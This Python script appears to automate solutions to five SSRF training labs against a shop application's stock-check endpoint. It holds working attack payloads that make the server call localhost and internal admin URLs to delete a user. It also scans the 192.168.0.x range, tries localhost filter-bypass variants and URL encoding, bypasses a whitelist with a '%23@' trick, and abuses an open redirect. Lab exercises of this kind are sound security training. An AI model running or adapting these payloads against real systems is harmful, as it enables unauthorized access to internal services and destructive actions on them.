from utilities import *

class SSRFVulnerability:

    def __init__(self, base_url):
        # assign base URL for all lab scenarios
        self.base_url = base_url
        self.path = '/product/stock'
        self.verify = 'Carlos'
        self.banner = 'Congratulations, you solved the lab!'
        self.header = {'Content-Type': 'application/x-www-form-urlencoded'}

    def local_system(self):
        '''
        Lab 1: Basic SSRF against the local server
        '''
        payloadURL = {'stockApi': 'http://localhost/admin/delete?username=carlos'}
        print("\nDeleting username carlos..\n{}Payload used: {}{}".format(textcolor.DANGER, payloadURL, textcolor.ENDC))
        return 1 if self.banner in http_request(self.base_url, self.path, [payloadURL, self.header]).text else 0

    def internal_system(self):
        '''
        Lab 2: Basic SSRF against another back-end system
        '''
        try:
            for i in range(1, 256):

                ip = '192.168.0.'+str(i)
                response = http_request(self.base_url, self.path, [{'stockApi': 'http://'+ip+':8080'+'/admin'}, self.header])

                print(append_colors(" [*] Checking {}: {} HTTP status",textcolor.OKCYAN).format(str(ip), str(response.status_code)),end="\r")

                if response and response.status_code == 200:
                    print(append_colors("\n\n{}: 200 HTTP status", textcolor.OKGREEN).format(ip))
                    payloadURL = {'stockApi': 'http://{}:8080'+'/admin/delete?username=carlos'.format(ip)}
                    print("\nDeleting username carlos..\n"+append_colors("Payload used: '{}'",textcolor.DANGER).format(payloadURL))
                    return 1 if http_request(self.base_url, self.path, [payloadURL, self.header]) else 0    
        except:
            print(append_colors("\nError occured",textcolor.DANGER))
            return 0
        
    def blacklist_filter(self):
        '''
        Lab 3: SSRF with blacklist-based input filter
        '''
        # bypasses for localhost domain
        bypasses = ['localhost','127.0.0.1', '127.1', '::1', '0:0:0:0:0:0:0:1', '::ffff:127.0.0.1', '127%2e0%2e0%2e1', '127%2e1']
        try:
            for i in bypasses:
                response = http_request(self.base_url, self.path, [{'stockApi': 'http://'+i}, self.header])
                print(append_colors(" [*] trying to bypass using {}: {} HTTP status           ",textcolor.OKCYAN).format(str(i), str(response.status_code)),end="\r")
                if response.status_code == 200:
                    print(append_colors("\n\n[{}] 200 HTTP status",textcolor.OKGREEN).format(i))
                    # url encode twice to bypass the defense
                    payloadURL = {'stockApi': 'http://'+i+'/%61dmin/delete?username=carlos'}
                    print("\nDeleting username carlos..\n"+append_colors("Payload used: {}",textcolor.DANGER).format(payloadURL))
                    response = http_request(self.base_url, self.path, [payloadURL, self.header])
                    return 1 if self.banner in response.text else 0
        except:
            print(append_colors("\nError occured",textcolor.DANGER))
            return 0
        
    def whitelist_filter(self):
        '''
        Lab 4: SSRF with whitelist-based input filter
        '''
        # appending localhost with original domain using URL fragmentation 
        payloadURL = {'stockApi': 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'}
        print("\nDeleting username carlos..\n"+append_colors("Payload used: {}",textcolor.DANGER).format(payloadURL))
        try:
            response = http_request(self.base_url, self.path, [payloadURL, self.header])
            return 1 if self.banner in response.text else 0
            
        except:
            print(append_colors("\nError occured",textcolor.DANGER))
            return 0
        
    def open_redirection(self):
        '''
        Lab 5: Bypassing SSRF filters via open redirection
        '''
        payloadURL = {'stockApi': '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'}
        print("\nDeleting username carlos..\n"+append_colors("Payload used: {}",textcolor.DANGER).format(payloadURL))
        try:
            response = http_request(self.base_url, self.path, [payloadURL, self.header])
            return 1 if self.verify not in response.text else 0
            
        except:
            print(append_colors("\nError occured",textcolor.DANGER))
            return 0

def handle_choice(number, instance):
    '''
    This function is used to handle different user input choices that 
    executes different lab exercises with their respective payloads
    '''
    if number == 1:
        if instance.local_system():
            print(append_colors("Local Server: Username Deleted Successfully\n",textcolor.OKGREEN))

    elif number == 2:  
        if instance.internal_system():
            print(append_colors("Remote Server: Username Deleted Successfully\n",textcolor.OKGREEN))

    elif number == 3:
        if instance.blacklist_filter():
            print(append_colors("Blacklist Bypass: Username Deleted Successfully\n",textcolor.OKGREEN))

    elif number == 4:
        if instance.whitelist_filter():
            isFailed = False
            print(append_colors("Whitelist Bypass: Username Deleted Successfully\n",textcolor.OKGREEN))

    elif number == 5:
        if instance.open_redirection():
            isFailed = False
            print(append_colors("Open Redirection: Username Deleted Successfully\n",textcolor.OKGREEN))

    else:
        print(append_colors("\nInvalid choice.",textcolor.DANGER))

def main():

    data = [
        ["(1)", "Basic SSRF against the local server"],
        ["(2)", "Basic SSRF against another back-end system"],
        ["(3)", "SSRF with blacklist-based input filter"],
        ["(4)", "SSRF with whitelist-based input filter"],
        ["(5)", "Bypassing SSRF filters via open redirection"]
    ]

    choice, url = get_input(data)

    if(choice > 0):

        # Create an instance of SSRFVulnerability with the base URL of the shopping application
        instanceVar = SSRFVulnerability(url)

        try:
            handle_choice(int(choice), instanceVar)
        except:
            print(append_colors("\nInvalid Input\n",textcolor.DANGER))

if __name__ == '__main__':
    main()
